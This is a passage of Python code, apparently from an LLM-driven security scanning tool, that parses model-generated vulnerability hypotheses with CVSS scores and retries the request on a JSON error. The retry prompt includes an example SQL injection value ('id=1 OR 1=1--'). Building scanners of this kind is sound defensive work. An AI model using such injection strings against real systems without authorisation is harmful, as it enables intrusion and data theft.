                cleaned = re.sub(r"```[a-z]*\n?", "", result_text).strip()
                match = re.search(r"\[.*\]", cleaned, re.DOTALL)
                if match:
                    cleaned = match.group(0)
                hypotheses = json.loads(cleaned)
                for h in hypotheses:
                    score = h.get("cvss_score", 0.0)
                    sev   = _severity_from_score(score)  # canonical label from CVSS score
                    workspace.add_hypothesis(
                        h.get("type", "Unknown"),
                        h.get("details", "No details"),
                        h.get("location", "/"),
                        cvss_score=score,
                        cvss_vector=h.get("cvss_vector", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N"),
                        severity=sev,
                    )
                print(
                    f"[+] LLM added {len(hypotheses)} contextual hypotheses "
                    f"(attempt {attempt+1}). Total: {len(workspace.hypotheses)}."
                )
                return
            except (json.JSONDecodeError, TypeError) as e:
                if attempt == 0:
                    print(f"[!] JSON parse failed: {e}. Retrying...")
                    messages.append({"role": "assistant", "content": result_text})
                    messages.append({"role": "user", "content": (
                        "Return ONLY a valid JSON array. No markdown, no explanation.\n"
                        'Example: [{"type":"SQLi","details":"id=1 OR 1=1-- in GET /search","location":"/search?id=1","cvss_score":9.8,"cvss_vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H","severity":"Critical"}]'
                    )})
                    retry = await self.engine.generate_response(
                        messages=messages,
                        system_prompt=self.system_prompt,
                        max_tokens=2048,
                    )
                    result_text = self.engine.extract_text(retry)
                else:
                    print(f"[!] LLM retry failed: {e}. Structural hypotheses still available.")
